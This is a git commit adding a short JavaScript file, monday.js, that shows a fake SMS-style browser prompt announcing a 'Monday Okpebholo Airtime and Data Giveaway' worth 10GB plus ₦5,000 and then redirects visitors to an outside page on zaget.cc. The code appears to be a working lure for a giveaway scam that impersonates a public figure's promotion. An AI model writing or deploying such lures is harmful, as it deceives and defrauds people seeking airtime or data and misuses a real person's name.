ab765ddac4414e6c77df001b99cafc5dfaa18f59
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-27 11:28:01 +0530

    Add files via upload

---
+++ monday.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 10GB + ₦5,000 '
+password=prompt('SMS: Hello, you are selected to benefit from Monday Okpebholo Airtime and Data Giveaway. Press Ok to get offer now ','ACTIVATE 10GB + ₦5,000');
+if (password != 'ACTIVATE 10GB + ₦5,000') {
+location.href='https://zaget.cc/edo-state.html';
+}
